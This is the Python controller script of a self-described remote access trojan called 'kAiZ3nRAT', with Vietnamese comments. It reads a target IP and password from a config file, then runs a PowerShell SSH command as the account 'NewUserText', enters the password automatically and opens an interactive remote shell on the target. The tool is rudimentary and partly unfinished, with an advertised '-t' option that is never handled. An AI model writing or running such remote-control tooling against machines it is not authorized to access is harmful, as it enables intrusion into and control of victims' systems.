#!/usr/bin/python
import os
import sys
from modules import *
import getpass
import wexpect

help_menu = """
    [+] The First RAT's kAiZ3n
    [+] Create By : kAiZ3n

    Agurment:
    xxx.kAiZ3n = configuration file to add to kAiZ3nRAT
    Example:
    python main.py -t <IpAddress>
    python main.py -f kAiZ3n.rat
    """
options_menu = """
    [*] Select A number to Select A Payload [*]
    Payloads
    [0] Remote Console
     
"""
username = getpass.getuser()
header = f"{username}@kAiz3n $ "
#read config file
def read_config(config_file):
    configuration = {}
    read_lines = open(config_file,"r").readlines()
    # get target configuration
    configuration["IpAddress"] = read_lines[0].strip()
    configuration["WorkingDirectory"] = read_lines[1].strip()
    configuration["Password"] = read_lines[2].strip()
    return configuration
#OS detection
def os_detection():
    #Windows
    if os.name == "nt":
        return "w"
    #other
    if os.name == "posix":
        return "l"
#connects rat to target
def connect():
    configuration = read_config(sys.argv[1])
    #get config info

    ipv4 = configuration.get("IpAddress")
    targetPassword = configuration.get("Password")
    working_directory = configuration.get("WorkingDirectory")
    print(configuration.get("IpAddress"))
    # remotely connect
    ssh_cmd = f'powershell ssh NewUserText@{ipv4}'
    child = wexpect.spawn(ssh_cmd)

# Chờ yêu cầu nhập mật khẩu
    child.expect("password:")

# Nhập mật khẩu tự động
    child.sendline(targetPassword)

# Giữ kết nối để nhập lệnh từ shell
    child.interact()
# gets arguments
def parser(arguments):
    pass
# command line interface
def cli(arguments):
    if arguments:
        print(options_menu)
        option = input(f"{header}")
        if option == "0":
            connect()
    
    else:
        print(help_menu)


#main code
def main():
    try:
        sys.argv[1] # check xem option có được truyền vào hay không
    except IndexError:
        arguments_exist = False
    else :
        arguments_exist = True
    #run command line interface 
    cli(arguments_exist)

# runs main code
if __name__ == '__main__':
    main()
